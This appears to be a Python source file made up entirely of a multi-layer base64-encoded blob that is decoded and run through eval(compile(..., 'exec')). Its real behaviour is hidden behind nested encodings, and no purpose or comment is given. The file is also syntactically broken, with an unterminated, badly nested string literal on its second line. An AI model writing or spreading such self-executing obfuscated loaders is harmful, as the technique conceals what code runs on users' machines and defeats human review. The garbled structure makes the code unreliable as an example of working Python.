import base64
oOO0oooOO = "import base64
oOO0oooOO = "aW1wb3J0IGJhc2U2NApvT08wb29vT08gPSAiYVcxd2IzSjBJR0poYzJVMk5BcHZUMDh3YjI5dlQwOGdQU0FpWVZjeGQySXpTakJKUjBwb1l6SlZNazVCY0haVU1EaDNZakk1ZGxRd09HZFFVMEZwVG5wa01Vd3diRFZSYWtwb1ZucEJNbGRzYUc5a01XeFlUbGQwYTFJd1duQlVNalZQWkVac1dWTnFRbWhXZWxaeVYyeGpNVTFGT1hWVmJXaGFZbXMwZDFscVRrSlBWVFZGWTBod2FVMXNiM2RhUldSSFlWZE5lbFZ1V21wU1JFRjNWREkxVDJJeVJsaFhha0pyVFcxNGNscEZaRzVQVlRWRllqQjBTbVZWUmpCVE1tdDNXakZyZVU5WGRHaFdlbFoxVkRKc1EwMVhVa2hYV0ZKUVVUQkdNRk15YTNkVE1HdzFUVWhTVFZWNlFqQlVSazEzWkVWNFZFMUlVazFWZWtJd1ZFWk5kMlJGZUZSTlNGSk5WWHBDTUZSR1RYZGtSWGhVVFVoU1RWVjZRakJVUmsxM1pFVjRWRTFJVWsxVmVrSXdWRVpOZDJSRmVGUk5TRkpOVlhwQ01GUkdUWGRrUlhoVVRVaFNUVlY2UWpCVVJrMTNaRVY0VkUxSVVrMVZla0l3VkVaTmQyUkZlRlJOU0ZKTlZYcENNRlJHVFhka1JYaFVUVWhTVFZWNlFqQlVSazEzVXpGd2RWTnVXbWxWTUVveVdUQmtWMlJXY0ZsVGJtUktVako0TUZrd1l6VmxWMUpFVVcxb2FsSXlkSHBUVldSaFkwWndXR1ZIZEdwbFdHUnVXV3hqTldFeGNGaGxTSEJOVVRCS2JWRXlNV0ZsVjBsNVRVZGtZVkl3V1hkWGJHaFRZMGRLV0ZaWFpHaFdla1l6V1dwT1MwMUZiRWhWYldoclVqRlpkMWxXWTNoaVJYaElWVzFvYTFJeFZreFhiVFZMWkcxS1ZGRnVXbXBTTVZveFYyeG9TMlF3ZUhSV2FsSmFUV3hhTTFwRlpITmtiVXAxVkZka2FGWjZSak5aYWs1TFRVVnNSMWR0YUdsU01uaHlWMVpvVTJOSFNYbE9WVnBxWW10d01sa3liRFJXYlUxNVZtNXNVMWRGY0RWWmFrNUtVekJPZEZSdVRscFhSVFUyVTFWa1MwMVhUWHBTYWtaWlRXcEdiMXBGYUV0alIwcFlUMWhXYUZaNmFIWlpiR00xWVRGd1dHVkljRTFoZWtZeVYydGtWMk13ZEZWaU1IUktVVEJHYmxOVldUVmtWbXhZVFZkNFNsSkVRbTVUYWtwTFRWZE5lbEpxUmxsTmFrWnZXa1ZvUzJOSFNsaFBXRlpvVm5wb2RWRXliRUphTUd4RVVXMWFZVkl4V2paWFZFNUxZMGRPU1ZWdVFtbE5hbEp1VlVaT1EwMVZiSEpVUlZJeFltczFORnBHWkZkaE1XeFVVVzEwWVZVd1NqQlhWbWhUWlZkR1dFMVlXbWxpVjNneVUxZGtkbG93YkVSUlYyUlpUVEJ3YzFkVVJUVmtWbXhZVFZkNFNsSkVRbTVUYWtreFpHMUtXRk51YkdGVk1rNU1VMVZPUWxvd2JFaFZiWGhoWVZWS2MxbHROV0ZqUm14WlUyMWFhazFxYkhwWlZtUlBZMGRTU1ZadGRFeFRSVFZ6V1d0a1dtTXdiRWhVYm14TlVUQkplRmxXWkZKak1HeElZa2QwYW1WWVpHNVhWRWsxWkZkU1NGWnFVbXRTUkVaUVdXcEpNV0pGZEZWaU1IUktVVEJHYmxOVlRrSmFNR3hFVVc1c1lWWXlUbTVWUms1RFpXeHdXR1ZITVUxaVZYQTFXV3BPYTJWc2NGUmhSM0JxWVZoa2JscEdaSE5oTUhoRVVXNUNZVk5GTVhwVFZXUlBaRzFLZFZWdGVHeFRSa1UxVjFSSk5XUlhVa2hXYWxKclVUSjRhVlJWV1hkVE1HeEVVVmRrU2xFd1JtNVRWVTVEWVZkSmVWVnFWa3BTUkVKdVUyNXNhbE13YkVSUlYyUktVVEJHYmxOVlRrTmhWMGw1VldwV1NsRXpUVFZUVlU1TFpXMUplV1ZJUWxwTmJYZDNXa1prVWs1cmNGbFVXRTVLWVZWR2MxTlZUbTlsVm5CWVdUTldhRll4Um5kUk1teENXakJzUkZGWFpFcFJNRVp1VjFjd05XRXlWbFJSV0VwUlZUQkdjRnBGWXpWa1IwbzJZako0YW1WWVpIQlRWVTVXV2pCMFNWTnRlR0ZsVkZWM1dXcEplR1JyZEZKaU1tUktVVEJHYmxOVlRrSmFNR3hJVTI1YVlWTkhkRzVUTTI5M1dqQnNkRmR1V21sU01uZ3lWREpzVjJWcmVFUlRWMlJMVlRCR2Rsa3lNVmRpYTNoMFYyNWFhVkl5ZURKVE1VWjJXakJzUkZGWFpFcFJNRVp1VTFWa1MyUnNjRWxoTW1STVpXcENibE5YTURGTlYwcFlWbTVzYVdWdE9YTlpNMnd6WVZWc1JGWlhaRXhUUlhCelYyNXJNV1JYVWxoTlYzaHFZbFJvZDFFeWJFSmFNR3hFVVZka1NsRXdSbTVYVnpBMVlUSldWRkZZU2xGVk1FWndXVzB3TldSR2JIVlRiWGhaVFd4YU5sa3dZelZsYlVvMllqSjRhbVZZWkhCVFZVNVdXakIwU1ZOdGVHRmxWRll4V1dwSmVHRlhUblJXYlZwaFYwVTFNMWxxVGs5a2EzUlNZakprU2xFd1JtNVRWVTVDV2pCc1NGTnVXbUZUUjNSdVV6TnZkMW93YkhSU2JtUmhWak5vZWxsV1pGTmthekZYVDFkNGFrMHdTakpaZWtrMFRtdHdXVlJZVGtwaFZVWnpVMVZPYjJWV2NGaFpNMVphVjBWS2MxbHJaRFJqUm5CSVQwaG9XVTFzV2paWk1HTTFaVzFLTldFd2RFcFJNRVp1VTFWT1Fsb3diRVJSYld4cFRXeEpNVk5WVG5wUFZXeEVVMjFvYWxJeFducFphMlJ6WVRKS05sTnRXbUZYUlRVeldXcE9UMlJyT1hCV2JuQk5VVEJzYmxOc1RrSmlNazUwVm0wMVRXSlZXak5YYkdRMFl6SkdXRlZ1V2s1aVJHeHpXWHBPUTJSdFRYbFBTRUpFWVZWR2JsTlZUa0phTUd4RVVWZGtXbUpVYkhKYVZrNUNZMnhDVkZGWGJHbGlWR3d3VjFjMVMySkdaM2xXYm5CcVVucHNObGRXVW5aaVIwNDFaREpzU2xFeFZtNVRNR2hQVFVkT2NHRkliR0ZXTWs0eFdXMHdOV1JHYkhWVGJYaFpUV3hhTmxrd1l6VmxiR3hVWVROQ1JHRlZSbTVUVlU1Q1dqQnNSRkZYWkZwaVZHeHlXbFpPUW1Oc1FsUlJWMnhhVjBWS2MxbHJaRFJqUm5CSVQwaG9XVTFzV2paWk1HTTFaV3hzVldJeWVHcGxXR1J3VTFWT1Zsb3dkRWxUYlhoaFpWUldiMWt3WkZkak1rcElZa2QwYVdWcldtMVhiR2hQWkRKSmVsUnRhRXhWVnpsdVUxVk9RbG93YkVSUlYyUktVakJ3TWxkcmFISmFNSFEyVFVka1NtSlZXak5YYkdRMFl6SkdXRlZ1V2s1aVJHeHpXWHBPUTJSdFRYbFNWRnBMVjBVeGVsTlhiRUppUld4RVlVaHNZVll5VGpGWFZtaERZa2RLU0dWSVFtRlNlbWcxVjBSS1YyVnRUa2hQV0hCYVZUSjBURk5WVGtKYU1HeEVVVmRrU2xFd1NuQlpha3BUVGxWc1JHTjZiRXBSTUhCMFYyeGtUMkl4YkZkUFdGSmFWMFpLTlZsV1kzaGtiVXAwWWtoYVVHRldXalpVUlU1S1dqQndWRkZYT1dwTk1VbzFVekJvUzJKR2NEVk9WekZoVmpBMWRsZFdXVFZrUm14WlZXNXNhRlo2UmpKWmJURnpaR3QwVkdFd2RFcFJNRVp1VTFWT1Fsb3diRVJSYmxKYVZqSjRlbGRFU1RWaFYwWndVVlJzU2xORk5YTlphMlJhWkZkT1NFOVlXbWxSZWxaMVYyeG9VbUl3YjNsTlYyaG9Wak5rTVZsc1pGZGxiVTE1VW0wMVlWVXlUbmRSTW14Q1dqQnNSRkZYWkVwUk1FWnVXV3BPUTJGc1ozbFVibHBwWWxad2JWbHFTa3RqVld4RlRVZGthazFzV25wWGJXc3haREpKZVU5WVRrMWlWMUp6V2tWT2JtSnRTWHBSYlhCb1ZucHNNVmRzYUU5YWJHdDVUMWhXWVdGWFRuZFJNbXhDV2pCc1JGRlhaRXBSTUVadVYxUkpOV1ZYVG5SV2JWcGFUV3BzTVZkdGR6VmtiR3gwWWpKa1VWVXdTalpYYkdRMFlsVjRkVkZ1V21sTmJtUXhWMnBLVjAxRmRFUmFTSEJhVmpBMU5WZFdXVFZoYlVsNlUyNXNZVlo2YkcxWFZFazFaRlp3ZEdKSE5VdGxWM1JNVTFWT1Fsb3diRVJSVjJSS1VUQktNbGt3WkU5YWJHdDVUMWhXWVdKRWJIZFhhMmhPV2pGQ1ZGRnVXbXBTTURWdFYxUkpOV1JXY0hOUFdGcGFZbGM1TVZsNlNsZGhSMDUwVkcwNVRGSXdOVFZVUlU1RFRWZEdXRlZZVGtwU2JsSnJWRVZPUTJGdFNYbE9WRUpoVjBkbmQxVkdaRTlrYlVwMVZXMTRiRk5HUm5kUk1teENXakJzUkZGWFpFcFJNRVp1V1dwT1EyRnNaM2xVYmxwcFlsWnNibFZHVGtOa2JVNUlWRzFhV2sxcWJERlhiWGMxWkd4c2RHSXpWbHBpYTNBeVdrUk9UMkpGZEVoVWJteE5VVEJKZUZsV1pGSmpNa2w2VVcxd1dVMXJOVEpaYlRGaFdtMUdXRlZ1Y0UxU01EVXlXVzAxVTJKSFZrbFZWR3hhVFdwc01WcEZaRmRPUjFKRVlrZEtUbEpxUW01WlZtUmFXakpKZWxGdGNGbE5helV5V1cweFlWcHRSbGhWYm5CS1VqRmFlbGw2U2xaYU1WSjBUMWhXWVZWWE9XNVRWVTVDV2pCc1JGRlhaRXBSVnpsdVUxVk9RbG93YkVSUlYyUktVakExTWxreU5VdGlSMGw0VDFoQ1lWTkZNVzVWUms1RFlXMUplbE51YkdGV2FteHhXV3BKTVdKV1ozbFBWMnhvWVZSV05sZHNaRWRsVm10NVdqSTVXazB3YkhwVFZXaFhZMFp3UkdReVpGaGxWMlIxV1RJeFYyRkhTa2hpUkZwWlRUQTFNbGxyWkhOaGEzQTFaREkxVVZVeVRucFdhMmhMVFZad1ZHSkhVazFSTUVweFdXcEpNVTFHY0ZsaFJFSlJWakExTWxsdE5WTmlSMVpKVlZoQ1JHRlZSbTVUVlU1Q1dqQnNSRkZYWkdGV2VrWnZXVlprTkZwdFVraFBSMlJSVlRCR2RWTnVaSFphTUd4RVVWZGtTbEV3Um01VFZXUlhaRVpzV0dKSVRsbE5helZ4VTFWUmQxb3djRFZaTUhSS1VUQkdibE5WVGtKYU1HeEVVVzVDWVdGVlNuRlphazVMWlZad1dFOVhXbWhXTVVvMlZESmtkbG93YkVSUlYyUktVVEJHYmxOVlRrSmFNR3hFVVcxd2FVMHdjRFZYYkdNMVdtMUplVk51Um1wbFZVVTFVMVZrVDJSdFRuVlRiWGhaVFdzMU1sbHRNV0ZhYlVsNVUyNUdUV0pWY0RWWmFrNXJaV3h3VkdGSGNHcGhXR1J1V2taa2MyRXdlRVJSYlhCcFRUQndOVmRzWXpWYWJVWllWVzV3VFZFd1NuRlpha2t4VFVad1dXRkVRbEZXTURVeVdXMDFVMkpIVmtsVldFSkVZVlZHYmxOVlRrSmFNR3hFVVZka1NsRXdSbTVUVldSWFpFWnNXR0pJVGxsTk1Vb3lVMVZSZDFveGEzbFBXR3hxWWxaYU1sZEVTVFZoVjBaMVZHMUtUbEpxUWpGWFZFazFaVmRPZEZadVdrUmhWVVp1VTFWT1Fsb3diRVJSVjJSS1VUQkdibE5WWkhOaVZXeElaVWQ0YVdGWGFIRlphazVMWlZad1dFOVhXbWxOYTNCNFdUTnNjbG94UW5CUldHaFFXakk1YmxOVlRrSmFNR3hFVVZka1NsRXdSbTVUVlU1Q1dqQnNSRkZYWkZwTmFtdzFXVEl4VjJSc1ozbFBWMnhvWW1zeE1Wa3dZelZrTUhSRlVWaENSR0ZWUm01VFZVNUNXakJzUkZGWFpFcFJNRVp1VTFWT1Fsb3diRVJSYms1b1YwVTBkMWRXV1RWaGJVbDZVMjVzWVZaNmFHNVZSazVEV1d4cmVVOUlWbHBOYW13MVdUSXhWMlJyYkVoWGJscHFZVlZLY1ZsdWJFTmpSMHB3VVcxd2FVMHdjRFZYYkdNMVdtMUplVk51Um1wTlZFSk1VMVZPUWxvd2JFUlJWMlJLVVRCR2JsTlZUa0phTUd4RVVWZGtTbEl4V2pCWFZtUnpZekZuZVZSdGNFcFNSRUp1VTI1c00ySnJlSFJqU0Zwb1ZucFNkbGxyWkhObGJWSklVbTFhV2sxcWJEVlpNakZYWkd0MFVtSXlaRXBSTUVadVUxVk9RbG93YkVoTldIQmhUVlJyZVZkV1pEUmxhMnhGVFVka2JHUXlPVzVUVlU1Q1dqQnNSRkZYWkVwUk1FWnVVMVZPUW1KdFRYcFdiV3hvWWxaYWNWcEZUbXBPYTJ4RVdrVk9hMWRGTlhGWFZtaEtXakpLV0ZKcVFtcGlWM2d3V1dwSk1XTkhTalZaTTA1RVlWVkdibE5WVGtKYU1HeEVVVmRrU2xFd1JtNVRWVTVyWVRGc1dWVnRlRXRsYlRsdVYydGtSMDFHY0ZsVmJrSnBWakZXTVZsdE1EVk5NSFJFWVROV2FrMHhTalZYYlRWVFkwZEtXRlpYT1V0bFZscGhWRVpPVjJSRmVGUldiWFJMWlZkMGVsRXliRUphTUd4RVVWZGtTbEV3Um01VFZVNUNXakJzUkZwRVJtcE5iRm8xVjBSS2MyRXdjRFppTW1SclZqSjRjbFJGUm5aYU1HeEVVVmRrU2xFd1JtNVRWVTVDV2pCc1JGRlhOV2xXZW14eVYyeGtNMkpyT1hCUlZ6VmFZbXhhTmxreGFGZGFiVXBZVW1wQ2FtSlhlREJaYWtreFkwZEtOVmt6VGtSaFZVWnVVMVZPUWxvd2JFUlJWMlJLVVRCR2JsTlZUbXRsVm5CWlZHMWFhRll4Um5WVU1teERaVlp3V0ZrelRrUmhWVVp1VTFWT1Fsb3diRVJSVjJSS1VUQkdibE5WVG10aFYwbDVWV3BXV1UweFNuTmFWV2hTWW1zNWNGRnRiR2xOYkVreFZFVkdkbG93YkVSUlYyUktVVEJHYmxOVlRrSmFNR3hFVVZjMVlWWjZSbTlaVm1RMFdteHdkVk51V21sVk1rMHlVMVZqTldReGEzaFBWM0JwVFdwV2RGUkhNVTlrYlU1MVUyMTRhVTFVYkRWWGJHTjRZMGRTUkZGdVFtRmhWVW95V1RCa1QxcHNhM2xQV0ZaaFlWVktjMWxyYUU5aVJXeEVXVEkxVFZGWE9XNVRWVTVDV2pCc1JGRlhaRXBSTUVadVUxVk9RbUpzY0ZoTlYyaG9Wak5vYlZwRll6Umlhemx3VVcxNGFWWXdXbmRaYTFrMVRVZEtOV1F3ZEVwUk1FWnVVMVZPUWxvd2JFUlJWMlJLVVRCR2JsTnFTbGRrUm14WVlraE9XVTFyTlhGVGJuQjJXakZ3V0UxWGFHaFdNMmh0VjFSS1RtTXdUbkJSVjJSS1VUQkdibE5WVGtKYU1HeEVVVmRrU2xFeVVuTlpiR1JIWTBkS1IwOVhiRnBOYXpGMVZESnNhbUpyZUVKaU1tUktVVEJHYmxOVlRrSmFNR3hFVVZka1NsRXdSblZaTWpGWFpESktTV0pIV210U2VtaDFWREpzUW1KcmNEVmtNSFJLVVRCR2JsTlZUa0phTUd4RVVWZGtTbEV3Um01VGFrbDRZa2ROZWxSdGFHRk5iRnB0V1Zaa1VtSnJPWEJSYXpscFRXcFdjMVJGUm5aYU1HeEVVVmRrU2xFd1JtNVRWVTVDV2pCc1JGRlhOV3BpVmxwMFYyeG9TMkpIU25SVWJYaHFaVmROTWxOVlZURmtiVXAwVmxoT1JHRlZSbTVUVlU1Q1dqQnNSRkZYWkVwUk1FWnVVMVZPYTJWdFVsaFRha0pzVjBWS2MxTnVjSFphTUc5NlVXNU9XbFl5ZURGVGJtd3pVekJzUkZGWFpFcFJNRVp1VTFWT1Fsb3diRVJSVjJSTFRXMW9jMWRXWkZOaVIwNTFWRmMxVUdGVlNsQlpha2t4WWtWNFFtSXlaRXBSTUVadVUxVk9RbG93YkVSUlYyUktVVEJHZFZsc1pFZGpSMHBIVDFod1lWZEZiM2xYYkdoTFdtMUdXRlZYTlZCaFZVcFFXV3BKTVdKRmVFSmlNbVJLVVRCR2JsTlZUa0phTUd4RVVWZGtTbEV3Um5WWmVrNVRZVWRTU0ZaWE5WQmhWVVoxV1dwT1YwMUdiM2xQV0VKcFlsZE9kVlJGUm5aYU1HeEVVVmRrU2xFd1JtNVRWVTVDV2pCc1JGRlhOVnBYUmxsM1dXcEZOV0V4Y0ZobFIzaHJVakZXZFZReWJFTlNNV3hZWlVod1lWVlhPVzVUVlU1Q1dqQnNSRkZYWkVwVFJFSk1VMVZPUWxvd2JFUlJWMlJLVVRCS01GZFdaSE5qTVdkNVlrZDBTbEpFUW01WmJHUkhZMGRLUjA5WVdscGlWemt4VjFST1MySkdiRmxWYlhoTVVqQTFOVlJGVGtOTlYwWllWVmhPU2xKNlJqWlhha1UxVFd4c1dHVkljRTFSTUVweFdXcEpNVTFHY0ZsaFJFSk1WVmM1YmxOVlRrSmFNR3hFVVZka1NsTkZjSE5aZWs1Q1dqRkNWRkZ1VWxwV01uaDZWMFJKTldGWFJuQk9XSEJoVm5wV2NsTXdaRTlsVlhoRVVXcEdhRll4Um5wVFZWb3daRVpzV0dKSVRsbE5iWGh5VjBaT00xb3hXa2xUYWtaaFZUTm9jVmxxU1RGTlJuQlpZVVJDVEZWWE9XNVRWVTVDV2pCc1JGRlhaRXBUUlhCeldrVm9WMlZYU25CUlZ6bHFUV3hhZWxkdGF6Rk5NazUwWWtSQ1lWVXlhSEZaTW13eldqSlNXR0pIZEUxUk1FcDNWMnRvVG1Nd2JFbGpNalZxVFRGS2IxcEZaRlppYXpsd1VWYzFVMVo2VlhsWlZtUkhZVEpLTlZwRWJFMVJNRXB4V1dwSk1VMUdjRmxoUkVKUlZqQTFNbGx0TlZOaVIxWkpWVmhDU2xJeWVIUlRWV2hMWWtkTmVsRlhaR0ZXTTJnMlYyeE9RMVpYVG5WV2JYaE1WVmM1YmxOVlRrSmFNRTV3VVZka1NsRXdTblJYYkdSUFlqRnNWMDlZWkdGWFJrVTFVMVZrWVdOR2NGaGxSM1JxWlZSV1JsZFdhRk5pUlhSSlZsYzFVMkpXV25GWlZXUkdXakZ3U0ZaWFpHbFNNRlp1V1RCa1YwMUhSbGhVYmtJelRqQTFNVk51YkROYU1rNTBWbTVvYTFZeWVEVlhiR1JTVDFaS2RGSnVUbXBOYkZaNlUxVmtVMkpHY0hSU2FrWnBVMFpGTlZkdE1YTmlSMHBJVlc1d1RXRXhTbTlhUldSV1pGWnJlVTlZVm10U01Wa3dXa1ZaTlUxSFNYbFZiV2hzVlRKMFRGTlZUa0phTUd4SlZXNWFhVlo2WnpWVFZXUmhZMFp3V0dWSGRHcGxWRlpGV1ZWa1IyVlZkRWxXVnpWWFVucHNNRmx1Ykdwak1HeEpVMjE0YWxkR1duZFpNakZYWVRGQ1ZsZHRhR2xUUlRWelZFVk9RMlZ0UmxsalIzaFJWa2RrTTFNeFJuWmFNR3hFVVZka1lXSlViSHBaVm1NMFQxVnNTRmR1UW1GV00yaHlXVE5yTVZKSFJraFNibXhNVTBaV2RWVnRNRFZqTWtaWVQwYzFUVkV3U2pWWGJHaEhUVmRHV1ZOdGVHRlNSRVpJVjFaa05HVnNjRlJrTW1ScVRXMTNNbGRzVVhkbGF6RkVZVEIwU2xFd1JtNVRWV014VFZkS1dGWnViR2xsYWtKdVYyMHhjMkpIU2toVmJuQk5ZVEExZGxkV2FFcGlNbEpVV2tVNU0wNHpRakJYYkdoTFpHdHdOV1F5WkdwaVZsbzBXa1prYzJWV2NGaFZWR3hUWWxWYWVsbDZTbFpqTUd4SlZHNUNiR0pXVlRWVVdIQkNZMFZPY0ZGWFpFcFJNRW94V1dwSmVHRlhUblJXYlZwaFYwVTFNMWxxVGs5a2JFSlVVVzB4YUZZeFducFhhMmhPWkZaRmVXRkhhR3BoVjJSMVZrY3dOV1JHYkhWVGJYaE1VMFV4ZDFOdWJETmFNazUwVm01b2ExWXllRFZYYkdSU1QxWktkRkp1VG1wTmJGWjZVMVZvVDJOSFZuUldWR3hQVmtWR2QxRXliRUphTUd4RVVXMW9hbEl4V25wWmEyUnpZVEpLTmxKdFdtRlhSVFV6V1dwT1QyUnNRbFJSYlRGb1ZqRmFlbGRyYUU1a1ZrVjVZVWRvYW1GWFpIVlVWbVJYWlZWc1NGSnVaR0ZXTTJoNldWWmtVMlJyY0RWa01tUnFZbFphTkZwR1pITmxWbkJZVlZSc1UySlZXbnBaZWtwV1l6QnNTVlJ1UW14aVZsVTFWRmh3U21ORlRuQlJWMlJLVVRCS2Ixa3daRmRqTWtwSVlrZDBhV1ZyY0cxWGJHaFBaREpKZWxSdVdsRlZNRXAwV1Zaa1YyTXhjRWxVV0ZaU1RXMW9iMWt5Ykc1aWF6RjBWVzVhU2xJd1dqTlhiR1EwWXpKR1dGVnVXa3RsV0dSdVdUSXhWMlZIVWxoaVNHeGhWakZGTlZWdE1VZGpNazE1VmxoT1NsTkZOWGRhVnpGV1QxVXhObE5ZUWtSaFZVWnVVMVZPUTJSWFNYbE5WMnhxWWxaYWJWZHNhRTlrTWtsNlZHMW9VVlV3U25SWlZtUlhZekZ3U1ZSWVZsSk5iV2h2V1RKc2JtSnNVblJQV0ZKYVltdHdjMU13YUU1alJYQTFaREprYW1KV1dqUmFSbVJ6WlZad1dGVlViRk5pVlZwNldYcEtWbU13YkVsVWJrSnNZbFpWTlZSc1VrSmpSVTV3VVZka1NsRXdTbTlaTUdSWFl6SktTR0pIZEdsbGExcHRWMnhvVDJReVNYcFViV2hSVlRCS2RGbFdaRmRqTVhCSlZGaFdVazF0YUc5Wk1teHVZbXN4V0ZadWJFcFNNRm96VjJ4a05HTXlSbGhWYmxwTFpWaGtibGt5TVZkbFIxSllZa2hzWVZZeFJUVlZiVEZIWXpKTmVWWllUa3BUUlRWM1dsY3hWazlWTVRaVFdFSkVZVlZHYmxOVlRrTmhSMDVJVm01T2FWSXllSEpaYm5CTFdteHdXVlJ1WkdsTk1EVnZWVVpPUTJKWFJsaFdiazVoVTBVeE1WVlVTbTloUjA1d1dqSTFUbUpXU2pKVFZXUkhaREZ3V0dWSVRtaFdNVW95VTI1c00xb3lUblJXYm1oclZqSjROVmRzWkZKUFZrcDBVbTVPYWsxc1ZucFRWV2hQWTBkV2RGWlViRTVsYTJ4M1VUSnNRbG93YkVSUmJURmhWakExZGxkV1dUVmtSbXhaVlc1c2FGWjZSakpaYlRGelpHeENWRkZ0TVdoV01WcDZWMnRvVG1SV1NraFNha0poVlRKbmVGTnFRbUZpUm10NVlVZG9TbEl4U25OWmEwNURaRVpzV1ZWdWJHaFdla1l5V1cweGMyUnJjRFZrTW1ScVlsWmFORnBHWkhObFZuQllWVlJzVTJKVlducFpla3BXWTBWT2NGRlhaRXBSTUVvMldrVmtSMDFHY0ZWTlIyUmhZbGQ0YzFsclpGTmxhM2h6VkcxNGFWSXhXbkZhUldSelpHMUtjR0ZIU2t4Uk1sSkZXVEl4VjJGR2NFaFBSelZOVVRCR2RWVlVUa3RpUm14WVZXNWFTMlZYZEhwVE1FNXJVbTFLZFZkdVFscFdNVW95VTI1c00xb3diM2RXYmxacllsZDRiMWRyWXpSaWEzUlVaVWRTVFZFd1JuVlZiR2hQVFVac1dGVnVXa3RsV0dSdVdYcEtjMDVzY0ZWTlNHaFBZVmhrYmxreU1WZGhSbkJJVDFoV2FWTkhjelZXYTJoTFRWWndWR1F5WkdGU01WcDBWMVpvVjJNeVVrVk5SelZTVFRCd2MxZFdaRk5rYTNBMVlUQjBSR0ZWTVRCVVJrMTNaRVY0VkUxSVVrMVZla0l3VkVaTmQyUkZlRlJOU0ZKTlZYcENNRlJHVFhka1JYaFVUVWhTVFZWNlFqQlVSazEzWkVWNFZFMUlVazFWZWtJd1ZFWk5kMlJGZUZSTlNGSk5WWHBDTUZSR1RYZGtSWGhVVFVoU1RWVjZRakJVUmsxM1pFVjRWRTFJVWsxVmVrSXdWRVpOZDJSRmVGUk5TRkpOVlhwQ01GUkdUWGRrUlhoVVRVaFNUVlY2UWpCVVJrMTNaRVY0VkUxSVVrUmlWVFY2VjFab1QyVnJiRWxUYlhocVRWUnNjRnBHYUU5bFIxSlhUMWhTV2xkR1NqVlpWazV2WkVkSmVWVnRlR2xUUlRFeFZrWmpOV0V4Y0Zoa00wSlFXakk1YmxOVlRrSmFNV2Q1VGxkb2FWWXhWbTVWUms1Q1ltMU9kRlp1Y0ZsTmEyOTRXWHBPUjAxV1ozbE5WMmhyVTBWd2QxTnVaSFphTUd4RVVWZGtXVTFzU25OWmVrcFBaVmRHV1ZGcVFtaFdlbXd4VTFWUmQxb3lVbFJUYTFKcFRUQndOVmRzWXpSYU1YQklWbGRrV21Nd09ESlplazVIVFZad1dGVnRhRXBTTVVwelUxVmplR0ZIVWtsVGJrSnBWbnBzTVZsV1l6UmhWVTV3VVZka1NsRXdTbTFaTWpGWFlXeG5lVTVYYUdsV01WWnVWVVpPUW1KdFRraFdibXhxVFdwc01WZFdXVFZoVm14WlZtcENTMlF5T1V4VFZVNUNXakJzU0ZOcVJtcE5NRmw0VjBSSmVHRkhVa2xUYmtKcFZucHNNVmxXWXpWYWJVWllWVlJzU2xJeGNIZFhiR1EwWVRKT05VNVZOVnBXZWxVeFZGY3dOV1JXY0ZSYU1qVmFZbXhhTmxreGFGZGFiVXBZVW1wQ2FtSlhlREJaYWtreFkwZEtOVmt6VGtwVFJsWjFWbFZrVjAxSFJsaFVia0l6VGpBMU1WTlZaRk5pUld4SVZFVlNNV0pyTlRSYVJtUlhZVEZzVkZrelRrcFNlbXd4VjJ0a1YyTXhjRmxWYlhoUlZUSlNjVmRXYUU5aGJHeFlWVzE0UzJWWVpHNVpNakZYWlVkU1dHSkliR0ZXTVVVMVZXMHhSMk15VFhsV1dFSkVZVlZHYmxOVlRrTmhiVWw2VTI1c1lWWjZiRzFYVkVrMVpGWndkR0pITlZsTmJYaHlWVVpPUTJKWFJsaFdiazVoVTBVeE1WWkdaRWRrVjFaVlUyNWFhV0pXVm5aVGFrNVBZVVpyZWxOdGFGbE5helV5V1RJMVMySkhTWGhQVjNCcFRXcFdkRmxXWkdwaWEzaEVVV3BHUzAxRk5USlpNalZMWWtkS05Wa3pUa3BTZW13eFYydGtWMk14Y0ZsVmJYaFJWVEpTY1ZkV2FFOWhiR3hZVlcxNFMyVllaRzVaTWpGWFpVZFNXR0pJYkdGV01VVTFWVzB4UjJNeVRYbFdXRUpFWVZWR2JsTlZUa05sVm5CWVdrZGFhbUpXV2paWk1GazFZVmRTV1ZSdWFFcFNSRUp1VjIweGMySkhTa2hWYm5CTllrWktjMXBWYUZKaU1HOTRWVzE0YkZOR1NqSlRWV2hMWWtkTmVsRnFSbUZYUlRSM1YxWk9hbU5GVG01UVZEQnBRMjFXTWxsWGQyOVpNamwwWTBkc2MxcFRhR2xaV0U1c1RtcFJkVmxxV1RCYVIxWnFZakpTYkV0SE9WQlVla0oyWWpJNVVGUjVhM05KUTBrNFl6TlNlV0ZYTlc1UWFVbHpTVU5rYkdWSFZtcEtlV3R3SWdwbGRtRnNLR052YlhCcGJHVW9ZbUZ6WlRZMExtSTJOR1JsWTI5a1pTaHZUMDh3YjI5dlQwOHBMQ0FpUEhOMGNtbHVaejRpTENBblpYaGxZeWNwS1E9PSIKZXZhbChjb21waWxlKGJhc2U2NC5iNjRkZWNvZGUob09PMG9vb09PKSwgIjxzdHJpbmc+IiwgJ2V4ZWMnKSk="
eval(compile(base64.b64decode(oOO0oooOO), "<string>", 'exec'))"
eval(compile(base64.b64decode(oOO0oooOO), "<string>", 'exec'))